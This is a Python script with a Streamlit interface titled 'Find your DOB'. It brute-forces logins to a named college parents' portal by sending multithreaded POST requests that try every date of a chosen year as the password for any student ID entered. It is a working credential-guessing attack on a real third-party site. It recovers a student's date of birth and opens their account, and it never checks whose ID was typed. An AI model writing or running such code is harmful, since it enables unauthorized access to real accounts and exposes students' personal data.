import time
from datetime import date
from scraper import Scraper
from threading import Thread
import streamlit as st


class SisScraper(Scraper):
    @staticmethod
    def gen_payload():
        return {
            "username": "",
            "dd": "",
            "mm": "",
            "yyyy": "",
            "passwd": "",
            "remember": "",
            "option": "com_user",
            "task": "login",
            "return": "",
            "ea07d18ec2752bcca07e20a852d96337": "1"
        }

    def __init__(self, URL="https://parents.msrit.edu/"):
        self.URL = URL
        super(SisScraper, self).__init__()

    def get_post_body(self, payload):
        soup = self.get_soap(self.URL, "POST", payload)
        body = soup.body
        if not body.find(id="username"): return body

    def get_dob(self, usn):
        pass

    def brute_year(self, usn: str, year: int):
        workers = []
        dob = []
        t = time.time()
        self.start_session()
        for i in range(1, 13):
            worker = Thread(target=self.brute_month, args=(usn, year, i, dob))
            workers.append(worker)
            worker.start()
        for worker in workers:
            worker.join()
        self.stop_session()
        time_taken = time.time() - t
        print(f"Time taken: {time_taken}")
        return dob.pop()

    def brute_month(self, usn: str, year: int, month: int, dob: list):
        pl = self.gen_payload()
        for i in range(1, 32):
            if len(dob) > 0: return
            pl['username'] = usn.lower()
            pl['passwd'] = f"{year}-{month:02}-{i:02}"

            # self.get_post_body(pl)
            # if pl['passwd'] == "2003-12-31":
            #     dob.append(pl['passwd'])
            #     return pl['passwd']
            if self.get_post_body(pl):
                dob.append(pl['passwd'])
                return pl['passwd']


if __name__ == '__main__':
    st.title('Find your DOB')
    year = st.selectbox('Select year', [i for i in range(2000, 2005)])
    usn = st.text_input('Enter your USN')
    if usn:
        start = time.time()
        run = SisScraper().brute_year(usn, year)
        DOB = date.fromisoformat(run)
        formated_dob = DOB.strftime("%d %B %Y")
        st.write("Your DOB is:")
        st.subheader(f"{formated_dob}")
        end = time.time()
        taken = end - start
        st.write(f"Time taken: {taken: .2f} seconds")
